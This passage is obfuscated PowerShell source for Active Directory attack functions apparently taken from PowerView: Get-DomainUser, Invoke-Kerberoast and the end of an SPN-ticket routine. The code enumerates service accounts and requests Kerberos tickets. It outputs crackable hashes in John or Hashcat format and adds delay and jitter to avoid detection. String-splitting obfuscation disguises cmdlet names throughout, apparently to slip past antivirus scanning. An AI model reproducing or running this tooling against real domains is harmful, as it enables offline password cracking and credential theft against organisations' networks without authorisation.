                        ${O`Ut} | &("{0}{1}{2}" -f 'Add-Me','mbe','r') ("{1}{2}{0}{3}" -f 'propert','N','ote','y') ("{1}{4}{0}{2}{3}"-f 'xStre','TicketByte','a','m','He') (  $81E40::("{2}{0}{1}"-f'oStrin','g','T').Invoke(${t`ICKe`TbY`TESTrEAm}).("{1}{0}"-f 'lace','Rep').Invoke('-',''))
                    } else {
                        ${h`AsH} = "$($CipherText.Substring(0,32))`$$($CipherText.Substring(32))"
                        ${O`UT} | &("{0}{2}{1}"-f'Ad','Member','d-') ("{2}{3}{1}{0}" -f'erty','p','Notep','ro') ("{1}{2}{3}{0}"-f'Stream','T','i','cketByteHex') ${NU`LL}
                    }
                } else {
                    &("{0}{2}{1}"-f'Wr','ing','ite-Warn') "Unable to parse ticket structure for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq "
                    ${h`ASh} = ${NU`ll}
                    ${O`Ut} | &("{2}{0}{1}{3}"-f'-','Memb','Add','er') ("{1}{2}{0}" -f 'rty','Not','eprope') ("{5}{3}{0}{2}{4}{1}"-f 'He','eam','x','tByte','Str','Ticke') (  (gEt-VAriAbLe  81e40 -vAlUEOnLY  )::("{2}{0}{1}" -f'r','ing','ToSt').Invoke(${T`ICKEt`B`YteStR`e`AM}).("{2}{1}{0}" -f 'ce','a','Repl').Invoke('-',''))
                }

                if(${HA`SH}) {
                    if (${oUT`p`Utf`OrMAt} -match ("{1}{0}" -f 'n','Joh')) {
                        ${hasHf`O`RMaT} = "`$krb5tgs`$$($Ticket.ServicePrincipalName):$Hash"
                    }
                    else {
                        if (${d`IS`TI`Ng`UiShED`NAMe} -ne ("{0}{1}" -f'UNK','NOWN')) {
                            ${usERDOm`A`In} = ${d`IStI`NgU`iShEdNA`Me}.("{1}{2}{0}" -f'String','Su','b').Invoke(${dISTinG`Uis`HEDn`A`ME}.("{1}{0}"-f 'ndexOf','I').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                        else {
                            ${us`erdOma`in} = ("{1}{0}" -f'NKNOWN','U')
                        }

                        
                        ${HaSHfor`m`AT} = "`$krb5tgs`$$($Etype)`$*$SamAccountName`$$UserDomain`$$($Ticket.ServicePrincipalName)*`$$Hash"
                    }
                    ${O`UT} | &("{1}{0}{2}"-f 'be','Add-Mem','r') ("{3}{0}{1}{2}"-f'o','tepro','perty','N') ("{0}{1}"-f'Has','h') ${H`AS`HfoRmaT}
                }

                ${O`Ut} | &("{0}{2}{1}{3}" -f 'Add-','emb','M','er') ("{0}{1}{2}"-f 'N','o','teproperty') ("{1}{0}{3}{2}" -f 'mAccount','Sa','e','Nam') ${s`AMa`ccOun`Tname}
                ${O`Ut} | &("{2}{1}{0}"-f 'ber','-Mem','Add') ("{0}{1}{2}" -f 'Notepr','oper','ty') ("{4}{2}{0}{1}{3}"-f'tingui','shedN','s','ame','Di') ${D`IsT`iNgui`shEDnAmE}
                ${O`UT} | &("{0}{3}{1}{2}" -f 'Ad','-Memb','er','d') ("{2}{1}{0}{3}"-f 'pe','epro','Not','rty') ("{0}{3}{2}{4}{1}"-f 'Ser','ame','ncip','vicePri','alN') ${TI`cK`et}."SEr`V`ICEp`RiNciP`ALnaME"
                ${O`UT}."Ps`OB`ject"."TypEN`A`MEs".("{1}{0}{2}" -f'er','Ins','t').Invoke(0, ("{4}{5}{2}{0}{1}{3}" -f'rView.SPN','Ticke','e','t','Po','w'))
                &("{1}{0}{3}{2}"-f'rite-O','W','tput','u') ${o`Ut}
            }
            
            &("{2}{3}{1}{0}"-f'-Sleep','art','S','t') -Seconds ${rAn`DnO}.("{0}{1}" -f 'N','ext').Invoke((1-${Ji`TTEr})*${D`ELAy}, (1+${J`i`TTer})*${dEl`Ay})
        }
    }

    END {
        if (${logoNto`k`eN}) {
            &("{4}{6}{3}{5}{0}{1}{2}"-f've','rt','ToSelf','vo','I','ke-Re','n') -TokenHandle ${LO`g`OnT`oken}
        }
    }
}

function Ge`T-`DOmAIn`USER {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{6}{1}{3}{2}{5}{9}{0}{7}{8}" -f'Ass','l','ars','aredV','PSUs','MoreTh','eDec','ignm','ents','an'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{1}{3}{0}" -f'ocess','dP','PSShoul','r'}, '')]
    [OutputType({"{2}{1}{3}{0}"-f'ser','iew.','PowerV','U'})]
    [OutputType({"{4}{2}{0}{1}{3}"-f'erView.Use','r','w','.Raw','Po'})]
    [CmdletBinding(dEfaUlTparAMeTerSEtnAMe = {"{1}{4}{2}{3}{0}"-f 'on','AllowDel','gat','i','e'})]
    Param(
        [Parameter(pOsITioN = 0, valuEfROMPiPELiNE = ${T`RUE}, vALUEFrOMpIPElinEbYPropErTyNAmE = ${TR`Ue})]
        [Alias({"{3}{1}{2}{0}"-f 'me','shed','Na','Distingui'}, {"{4}{1}{3}{2}{0}"-f'me','ccount','a','N','SamA'}, {"{1}{0}" -f'ame','N'}, {"{2}{0}{1}{3}{4}" -f 'berDisti','nguish','Mem','ed','Name'}, {"{3}{0}{1}{2}" -f 'be','rNa','me','Mem'})]
        [String[]]
        ${iDEn`T`ITy},

        [Switch]
        ${s`Pn},

        [Switch]
        ${aDmI`Nc`ouNT},

        [Parameter(ParaMETErsEtnaMe = "all`owdelegAt`I`On")]
        [Switch]
        ${al`loWDe`LEg`At`ioN},

        [Parameter(paraMeteRsETNAME = "dis`ALLOwdeL`egaTi`on")]
        [Switch]
        ${DiS`Al`lOWdeLeGa`TI`ON},

        [Switch]
        ${T`RUSTe`DTo`Au`TH},

        [Alias({"{4}{0}{3}{6}{5}{2}{1}"-f 'sP','ed','r','r','Kerbero','thNotRequi','eau'}, {"{1}{0}{2}"-f 'reaut','NoP','h'})]
        [Switch]
        ${P`R`eaUTHNOTreq`UIrED},

        [ValidateNotNullOrEmpty()]
        [String]
        ${D`om`AiN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}" -f 'ter','il','F'})]
        [String]
        ${l`DAPF`iLteR},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${ProP`ER`T`IEs},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}" -f'ath','A','DSP'})]
        [String]
        ${sEa`R`c`HBaSE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{0}{2}{1}"-f'ainCont','oller','r','Dom'})]
        [String]
        ${SE`RvEr},

        [ValidateSet({"{0}{1}" -f 'Bas','e'}, {"{0}{2}{1}" -f 'One','el','Lev'}, {"{0}{1}" -f'Subtr','ee'})]
        [String]
        ${se`Arc`Hsco`pE} = ("{0}{1}" -f'S','ubtree'),

        [ValidateRange(1, 10000)]
        [Int]
        ${rES`ULTpAg`E`S`IzE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${S`ErvERtIme`L`I`mit},

        [ValidateSet({"{1}{0}"-f 'acl','D'}, {"{1}{0}" -f'roup','G'}, {"{1}{0}" -f'e','Non'}, {"{0}{1}"-f'Owne','r'}, {"{0}{1}"-f'Sa','cl'})]
        [String]
        ${SeC`Ur`it`YmaSkS},

        [Switch]
        ${t`oMbs`Tone},

        [Alias({"{1}{0}{2}"-f'ur','Ret','nOne'})]
        [Switch]
        ${F`iNDO`Ne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`REden`TIAl} =   ( VariAblE 6ZNDA8  -Va  )::"Emp`Ty",

        [Switch]
        ${R`AW}
    )

    BEGIN {
        ${sea`RcheR`ArgUM`eN`TS} = @{}
        if (${PSb`oUnD`Param`E`TERS}[("{2}{0}{1}" -f'om','ain','D')]) { ${sEa`RCHEra`RGUM`En`TS}[("{1}{0}"-f 'in','Doma')] = ${DOmA`iN} }
        if (${psb`O`UND`pARAm`eteRs}[("{2}{0}{1}" -f 'rt','ies','Prope')]) { ${SEA`R`Che`Ra`RGumENts}[("{0}{2}{1}" -f'Pr','erties','op')] = ${ProP`erT`iEs} }
        if (${PSB`Ou`ND`pa`Ra`metErS}[("{1}{0}{2}"-f 'ear','S','chBase')]) { ${SeA`Rc`He`RARgumE`NTS}[("{0}{1}{2}" -f 'Search','Ba','se')] = ${S`e`ARch`BAsE} }
        if (${P`sb`oUnDpArAm`et`erS}[("{0}{1}" -f'Ser','ver')]) { ${seaRC`H`er`A`RGUMenTS}[("{0}{1}" -f 'Serve','r')] = ${se`R`VEr} }
        if (${Psb`ouNdP`ARAME`T`erS}[("{3}{2}{0}{1}"-f 'cop','e','earchS','S')]) { ${Sea`RchER`ArG`UmE`NTS}[("{3}{1}{2}{0}" -f 'pe','hS','co','Searc')] = ${SEarc`h`ScO`pE} }
        if (${PSbo`Un`dP`Aram`E`Ters}[("{3}{2}{0}{1}" -f'PageSi','ze','esult','R')]) { ${SEArcHe`Ra`R`guM`EnTS}[("{2}{3}{0}{1}" -f'Si','ze','R','esultPage')] = ${r`e`s`UltpAGesI`zE} }
        if (${pSbo`Un`DPaRaM`eteRS}[("{3}{0}{2}{1}"-f 'r','imeLimit','T','Serve')]) { ${s`eAR`c`hER`ARGUmEn`Ts}[("{0}{4}{2}{3}{1}" -f'Se','it','rTimeLi','m','rve')] = ${SErVERti`MeL`Im`IT} }
        if (${PSb`oU`NDPaRA`meTErs}[("{2}{0}{1}" -f'curityMas','ks','Se')]) { ${SEa`RcHERA`R`G`UMEn`Ts}[("{1}{2}{0}{3}"-f 'i','Secu','r','tyMasks')] = ${Se`curIT`Y`maSKs} }
        if (${psB`OUN`DP`ArAMETeRs}[("{0}{1}{3}{2}"-f 'To','mbst','e','on')]) { ${S`EA`RCHe`RARG`UMENTs}[("{1}{0}{2}"-f'ton','Tombs','e')] = ${tO`mBs`ToNE} }
        if (${PsB`O`UNdPAR`A`M`EtERS}[("{2}{3}{1}{0}" -f'ntial','ede','C','r')]) { ${Searc`her`ArgU`meNTs}[("{2}{0}{1}"-f'e','dential','Cr')] = ${CRe`DEn`TiAL} }
        ${Us`Ers`EARcheR} = &("{4}{5}{3}{0}{1}{2}"-f 'e','a','rcher','nS','Get-','Domai') @SearcherArguments
    }

    PROCESS {
        

        if (${uS`E`RsEArCHER}) {
            ${iD`en`TiT`YfiLt`ER} = ''
            ${f`iLTer} = ''
            ${ID`E`NtitY} | &("{2}{1}{0}" -f 'Object','-','Where') {${_}} | &("{4}{2}{1}{0}{3}"-f 'c','-Obje','ch','t','ForEa') {
                ${IDE`NTIT`yi`NstANCE} = ${_}.("{0}{1}{2}"-f'Repl','ac','e').Invoke('(', '\28').("{0}{1}"-f 'Repla','ce').Invoke(')', '\29')
                if (${ideN`T`itYInSTa`NCE} -match ("{0}{1}" -f'^','S-1-')) {
                    ${ID`ENt`itYFIL`TEr} += "(objectsid=$IdentityInstance)"
                }
                elseif (${I`dENTiT`yins`T`Ance} -match ("{1}{0}"-f'=','^CN')) {
                    ${IdeNTi`TYf`iltER} += "(distinguishedname=$IdentityInstance)"
                    if ((-not ${P`S`BoUnDpaR`A`metErs}[("{0}{1}{2}"-f 'Dom','a','in')]) -and (-not ${psB`OuNDPa`R`A`MeterS}[("{0}{2}{1}" -f'Searc','ase','hB')])) {
                        
                        
                        ${iDE`NTIt`Ydo`MAIn} = ${IDentIty`I`Nst`An`ce}.("{0}{1}"-f 'SubStr','ing').Invoke(${id`eN`Tity`INstanCe}.("{2}{0}{1}" -f'd','exOf','In').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        &("{1}{2}{0}{3}" -f'erbo','Wri','te-V','se') ('['+'G'+'et'+'-DomainU'+'ser] '+'E'+'xtracte'+'d '+'dom'+'ain'+' '+"'$IdentityDomain' "+'f'+'rom '+"'$IdentityInstance'")
                        ${s`eArChera`R`GuMENtS}[("{1}{0}" -f'in','Doma')] = ${Id`E`NtiTy`do`mAIN}
                        ${us`eRsea`RCHeR} = &("{2}{0}{3}{4}{1}"-f't-DomainSe','r','Ge','a','rche') @SearcherArguments
                        if (-not ${Us`Er`se`ARcHer}) {
                            &("{0}{2}{1}" -f 'Wri','g','te-Warnin') ('[Ge'+'t-DomainUs'+'e'+'r'+'] '+'Una'+'b'+'le '+'t'+'o '+'ret'+'riev'+'e '+'d'+'o'+'main '+'se'+'archer '+'f'+'or '+"'$IdentityDomain'")
                        }
                    }
                }
                elseif (${i`dE`NtiT`y`iNsTanCE} -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    ${g`UidbY`T`eStR`inG} = (([Guid]${iDE`NTityIN`S`Ta`NCE}).("{0}{2}{1}"-f'T','yteArray','oB').Invoke() | &("{1}{2}{3}{0}" -f'ct','For','Each-Ob','je') { '\' + ${_}.("{0}{1}" -f 'ToSt','ring').Invoke('X2') }) -join ''
                    ${Id`EntITy`Fi`LtER} += "(objectguid=$GuidByteString)"
                }
                elseif (${iD`enTity`In`st`ANce}.("{0}{2}{1}" -f'Cont','s','ain').Invoke('\')) {
                    ${coN`Ve`RtedIdenTiTyIN`s`TA`N`Ce} = ${I`DENtiT`yinS`TaNcE}.("{0}{1}" -f 'Replac','e').Invoke('\28', '(').("{2}{1}{0}"-f'e','lac','Rep').Invoke('\29', ')') | &("{3}{1}{2}{0}"-f 'ame','e','rt-ADN','Conv') -OutputType ("{2}{0}{1}" -f 'ic','al','Canon')
                    if (${c`On`VErTE`d`IDE`NtitYinSTaNCE}) {
                        ${u`sERDOM`A`in} = ${conveRtEd`iDeNtIT`yi`Ns`T`A`NCE}.("{2}{0}{1}"-f'S','tring','Sub').Invoke(0, ${conv`e`RTe`DIdEnTit`yiNstaNcE}.("{0}{1}{2}" -f 'In','d','exOf').Invoke('/'))
                        ${uSE`Rna`Me} = ${i`dE`NtI`TyInS`TANCe}.("{0}{1}"-f'S','plit').Invoke('\')[1]
                        ${ide`NTi`TYFi`lter} += "(samAccountName=$UserName)"
                        ${s`eArChEr`Ar`gU`M`EnTs}[("{1}{0}"-f 'omain','D')] = ${UsE`RD`OmAIN}
                        &("{3}{0}{2}{1}{4}" -f't','Verb','e-','Wri','ose') ('[Get-Do'+'m'+'a'+'in'+'User] '+'Extr'+'act'+'ed '+'d'+'omai'+'n '+"'$UserDomain' "+'from'+' '+"'$IdentityInstance'")
                        ${u`SER`seArcheR} = &("{2}{0}{1}{3}" -f'S','ea','Get-Domain','rcher') @SearcherArguments
                    }
                }
                else {
                    ${I`d`EN`TItyfiLT`er} += "(samAccountName=$IdentityInstance)"
                }
            }

            if (${idenT`IT`y`FiL`TEr} -and (${Iden`TitYfI`Lt`Er}.("{0}{1}" -f 'T','rim').Invoke() -ne '') ) {
                ${fiL`T`eR} += "(|$IdentityFilter)"
            }

            if (${PSBOu`ND`p`ARaMeteRS}['SPN']) {
                &("{2}{0}{4}{3}{1}" -f'ite-V','se','Wr','bo','er') ("{5}{12}{9}{3}{2}{14}{7}{6}{8}{1}{0}{4}{11}{13}{10}" -f'vi','ser',' Sea','nUser]','ce p','[Get-Do','r n','ing fo','on-null ','i','al names','r','ma','incip','rch')
                ${fi`l`TER} += ("{2}{0}{4}{1}{3}" -f'cePrin','ipalN','(servi','ame=*)','c')
            }
            if (${Ps`BO`U`NdpaRA`MeTERs}[("{2}{0}{1}" -f 'llowDelegatio','n','A')]) {
                &("{0}{1}{2}" -f'Write','-Ve','rbose') ("{15}{6}{13}{4}{8}{9}{10}{3}{12}{14}{7}{1}{5}{11}{0}{2}"-f'e',' be ','d','ng fo','ainU','dele','-','can','ser] Sear','ch','i','gat','r us','Dom','ers who ','[Get')
                
                ${FI`lt`Er} += ((("{8}{7}{3}{10}{0}{1}{4}{12}{13}{11}{6}{2}{9}{5}" -f 'u','ntContro','4.803:','erAc','l:1.','1048574))','56.1.','(us','(!','=','co','5','2.840','.113')))
            }
            if (${pS`Bo`U`N`dPAraM`eTers}[("{5}{3}{4}{0}{1}{2}"-f'legat','io','n','all','owDe','Dis')]) {
                &("{0}{1}{2}"-f 'W','r','ite-Verbose') ("{6}{2}{13}{18}{15}{0}{7}{17}{5}{14}{4}{10}{8}{16}{11}{9}{12}{3}{1}"-f 'r] ','ion','t','t','t tru','users who are sensitive and','[Ge','Searching ','d f','g','ste','e','a','-Doma',' no','nUse','or del','for ','i')
                ${Fil`TER} += (("{8}{1}{6}{5}{9}{0}{2}{3}{7}{4}"-f '0.113556','Contro','.1','.4.','1048574)','2.8','l:1.','803:=','(userAccount','4'))
            }
            if (${p`sb`O`UNdpAr`AMet`erS}[("{2}{0}{1}" -f'i','nCount','Adm')]) {
                &("{2}{0}{3}{1}" -f 'it','bose','Wr','e-Ver') ("{1}{3}{4}{0}{2}{7}{6}{5}"-f 'nUser] Search','[Get','ing for admin','-','Domai','1','unt=','Co')
                ${F`IlTER} += ("{1}{2}{3}{0}{4}" -f'nt=1','(ad','mi','ncou',')')
            }
            if (${psbOUN`dPaRAM`ete`RS}[("{1}{3}{2}{4}{0}"-f 'ToAuth','T','st','ru','ed')]) {
                &("{1}{0}{2}{3}" -f '-','Write','Ve','rbose') ("{12}{10}{15}{2}{16}{17}{9}{8}{4}{22}{1}{7}{13}{20}{21}{6}{11}{19}{5}{18}{0}{3}{14}" -f 'er prin',' th','nUse','ci','ser','ntic','us','at ','for u','ching ','D','ted t','[Get-','a','pals','omai','r] Sea','r','ate for oth','o authe','re ','tr','s')
                ${f`ilt`ER} += (("{8}{6}{0}{3}{1}{5}{2}{7}{4}"-f 'wed','gat','to','todele',')','e','sds-allo','=*','(m'))
            }
            if (${psb`OU`NdPA`RameTerS}[("{5}{0}{1}{3}{4}{2}" -f 'auth','N','d','o','tRequire','Pre')]) {
                &("{1}{3}{2}{0}"-f'e','Wri','rbos','te-Ve') ("{10}{12}{18}{6}{7}{0}{9}{1}{4}{11}{23}{2}{22}{15}{16}{8}{13}{5}{19}{21}{3}{14}{17}{20}"-f'ser','g for','hat do ','au',' user acc','rbero','Domain','U',' ','] Searchin','[','ounts ','Ge','ke','thenti','uir','e','ca','t-','s','te',' pre','not req','t')
                ${FI`l`Ter} += ("{3}{0}{6}{8}{1}{5}{2}{7}{4}{9}"-f 'ont','1.2.8','13556.1.4.803:=4','(userAccountC','94304','40.1','r','1','ol:',')')
            }
            if (${Ps`BoU`N`dpARamet`Ers}[("{2}{0}{1}" -f 'A','PFilter','LD')]) {
                &("{1}{2}{0}" -f'ite-Verbose','W','r') ('[G'+'et-Dom'+'ainUs'+'er'+'] '+'U'+'sin'+'g '+'additi'+'o'+'nal '+'LD'+'AP '+'filte'+'r: '+"$LDAPFilter")
                ${fIL`T`er} += "$LDAPFilter"
            }

            
            ${u`A`cf`iLtEr} | &("{0}{1}{2}"-f'Where','-O','bject') {${_}} | &("{0}{2}{1}" -f'For','ach-Object','E') {
                if (${_} -match ("{0}{1}" -f 'NOT_.','*')) {
                    ${u`Ac`FIelD} = ${_}.("{0}{2}{1}"-f'Sub','ing','str').Invoke(4)
                    ${UaC`V`Alue} = [Int](${UacEn`Um}::${UAcfi`E`LD})
                    ${FILt`eR} += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                }
                else {
                    ${U`AC`VALUE} = [Int](${u`AC`enuM}::${_})
                    ${Fil`Ter} += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                }
            }

            ${us`E`R`SeARCheR}."f`IlteR" = "(&(samAccountType=805306368)$Filter)"
            &("{0}{2}{1}" -f 'Writ','-Verbose','e') "[Get-DomainUser] filter string: $($UserSearcher.filter) "

            if (${psbo`UNDpARaM`e`TeRS}[("{0}{1}" -f'Fi','ndOne')]) { ${rEsu`l`Ts} = ${u`SeR`S`EARCH`er}.("{0}{1}" -f 'Fi','ndOne').Invoke() }
            else { ${Resu`LtS} = ${U`ser`SeaR`cher}.("{2}{0}{1}" -f'dA','ll','Fin').Invoke() }
            ${rE`SU`Lts} | &("{3}{1}{0}{2}" -f 'jec','Ob','t','Where-') {${_}} | &("{2}{3}{0}{1}" -f 'ec','t','ForEach-','Obj') {
                if (${pSB`O`Un`dPAraMEtErs}['Raw']) {
                    
                    ${Us`eR} = ${_}
                    ${US`er}."P`sOb`jEcT"."TypenA`M`eS".("{1}{0}{2}"-f'r','Inse','t').Invoke(0, ("{3}{1}{2}{4}{0}" -f 'w','iew.Use','r','PowerV','.Ra'))
                }
                else {
                    ${U`SeR} = &("{1}{2}{0}{3}"-f'-LDAPProper','Con','vert','ty') -Properties ${_}."pro`PERti`eS"
                    ${us`Er}."PSob`J`eCT"."tY`peNA`mES".("{0}{1}{2}" -f 'In','se','rt').Invoke(0, ("{3}{4}{1}{2}{0}"-f'User','r','View.','Po','we'))
                }
                ${uS`er}
            }
            if (${res`ULts}) {
                try { ${RE`su`lts}.("{0}{2}{1}"-f 'd','e','ispos').Invoke() }
                catch {
                    &("{1}{2}{0}" -f'bose','Write-','Ver') ('['+'Get-Do'+'mainUs'+'er] '+'Erro'+'r'+' '+'dis'+'p'+'osi'+'ng '+'o'+'f '+'the'+' '+'R'+'esults'+' '+'ob'+'je'+'ct: '+"$_")
                }
            }
            ${u`s`eRse`Ar`chER}.("{0}{1}{2}" -f'dis','pos','e').Invoke()
        }
    }
}


function iN`VoKE-keRBEr`OA`St {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{0}{1}" -f 'houldProce','ss','PSS'}, '')]
    [OutputType({"{4}{3}{0}{2}{1}" -f'View.SP','et','NTick','ower','P'})]
    [CmdletBinding()]
    Param(
        [Parameter(pOsITiOn = 0, vALuefrOMPipELiNe = ${t`RUE}, vaLuEFrompIPelinebyProperTYNamE = ${TR`Ue})]
        [Alias({"{0}{2}{3}{1}"-f 'Distingui','e','shedN','am'}, {"{2}{0}{1}" -f'mAccount','Name','Sa'}, {"{0}{1}" -f'Nam','e'}, {"{1}{4}{2}{3}{0}{5}{6}{7}" -f 'guis','M','Dis','tin','ember','hedN','a','me'}, {"{3}{1}{2}{0}" -f 'me','ber','Na','Mem'})]
        [String[]]
        ${ID`EN`Tity},

        [ValidateNotNullOrEmpty()]
        [String]
        ${DOm`A`iN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f'ter','Fil'})]
        [String]
        ${LdAP`FIL`TEr},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f'ath','ADSP'})]
        [String]
        ${seArC`hb`ASE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{4}{1}{3}" -f'Do','ont','ma','roller','inC'})]
        [String]
        ${sEr`V`er},

        [ValidateSet({"{1}{0}" -f'ase','B'}, {"{2}{1}{0}" -f'vel','e','OneL'}, {"{0}{2}{1}"-f'Sub','ree','t'})]
        [String]
        ${SE`ARC`hsc`opE} = ("{0}{2}{1}"-f'Subtr','e','e'),

        [ValidateRange(1, 10000)]
        [Int]
        ${reSUlT`p`AgES`I`ZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SE`R`Vertim`elImit},

        [Switch]
        ${T`O`MB`stOnE},

        [ValidateRange(0,10000)]
        [Int]
        ${d`E`LAY} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${j`iTteR} = .3,

        [ValidateSet({"{0}{1}" -f 'Joh','n'}, {"{2}{0}{1}" -f'hc','at','Has'})]
        [Alias({"{0}{1}" -f 'Forma','t'})]
        [String]
        ${out`put`FoR`Mat} = ("{1}{0}" -f 'hn','Jo'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cR`e`dEnt`iAL} =  (vARIAblE  ('6Z'+'Nda8')  -VAl  )::"e`MPty"
    )

    BEGIN {
        ${uSe`RS`eARc`HeRar`GUmeN`TS} = @{
            'SPN' = ${t`RUE}
            ("{2}{1}{0}" -f'ies','t','Proper') = ("{8}{7}{0}{10}{6}{2}{3}{12}{1}{5}{11}{9}{4}"-f 'unt','nguis','d','ist','me','hedname,service','me,','amacco','s','lna','na','principa','i')
        }
        if (${PSbOUN`D`PaR`A`metE`RS}[("{2}{0}{1}" -f 'm','ain','Do')]) { ${USeRS`E`A`Rche`RarG`UmEnts}[("{0}{1}"-f 'D','omain')] = ${d`OMa`in} }
        if (${PsbO`UND`PAr`AMeters}[("{1}{0}{2}" -f'PFilte','LDA','r')]) { ${uSersearc`HERAR`g`UM`ENts}[("{1}{0}{2}" -f'DAP','L','Filter')] = ${lD`A`pF`ilTEr} }
        if (${P`SbOU`NDparA`MEtERs}[("{0}{2}{1}" -f'Search','ase','B')]) { ${u`SErse`ArChERaRg`UMeN`Ts}[("{0}{1}{2}" -f 'SearchBa','s','e')] = ${SE`Arch`Base} }
        if (${PsBOuNDp`A`Ram`eTErs}[("{1}{0}" -f'r','Serve')]) { ${u`se`RSE`AR`cHEr`AR`GuMEnts}[("{0}{1}{2}" -f'S','er','ver')] = ${s`ERV`eR} }
        if (${PsBoU`NDP`ArAmET`erS}[("{1}{0}{2}"-f 'chScop','Sear','e')]) { ${uSeRseAr`C`he`RAr`gUMENts}[("{0}{2}{1}"-f 'S','cope','earchS')] = ${S`ea`RCHS`COPE} }
        if (${psB`OUNdPAr`AM`ET`E`Rs}[("{0}{1}{2}" -f'ResultPa','geS','ize')]) { ${uSERs`eARcheRa`RG`U`Me`Nts}[("{2}{1}{0}{3}"-f 'lt','u','Res','PageSize')] = ${REsuLTpa`Ge`siZE} }
        if (${p`sb`OUnDpARa`me`T`eRS}[("{0}{2}{1}"-f 'Server','meLimit','Ti')]) { ${U`sEr`seARCHerA`RGU`mEnts}[("{4}{0}{3}{2}{1}" -f'er','imit','eL','verTim','S')] = ${S`E`RV`ert`IMELIMiT} }
        if (${pSboUN`dpar`A`metErs}[("{1}{0}"-f 'mbstone','To')]) { ${uS`erSE`ARcH`eRAr`gu`ments}[("{1}{0}{2}"-f'o','Tombst','ne')] = ${tom`B`STo`NE} }
        if (${pS`BOUND`p`AraMeTeRs}[("{2}{0}{1}" -f 'dent','ial','Cre')]) { ${useRs`E`AR`chE`RaRgu`MENTs}[("{1}{2}{0}" -f'ial','Cre','dent')] = ${C`R`EDenTiaL} }

        if (${pS`BoUNdp`A`Ra`meTE`Rs}[("{1}{0}{2}" -f'nti','Crede','al')]) {
            ${LoG`oN`TOken} = &("{3}{4}{0}{2}{5}{1}"-f'e-Use','ersonation','rIm','In','vok','p') -Credential ${c`ReDenT`i`AL}
        }
    }

    PROCESS {
        if (${P`S`BO`Undpa`RamETErS}[("{1}{0}{2}" -f 'de','I','ntity')]) { ${use`Rs`ea`RCHer`ARguMEN`Ts}[("{0}{1}{2}"-f'I','den','tity')] = ${I`dEN`T`itY} }
        &("{2}{1}{3}{0}" -f 'ser','-Doma','Get','inU') @UserSearcherArguments | &("{0}{2}{1}{3}"-f'Wher','b','e-O','ject') {${_}."SAMAcc`ou`N`TnamE" -ne ("{1}{0}"-f't','krbtg')} | &("{3}{4}{5}{1}{2}{0}"-f'cket','PN','Ti','Get-Dom','ai','nS') -Delay ${De`L`Ay} -OutputFormat ${OuTp`UtForM`AT} -Jitter ${Ji`Tt`ER}
    }

    END {
        if (${L`oGONTO`kEn}) {
            &("{0}{1}{4}{2}{3}"-f'In','voke-R','vertToS','elf','e') -TokenHandle ${logON`T`OkEn}
        }
    }
}
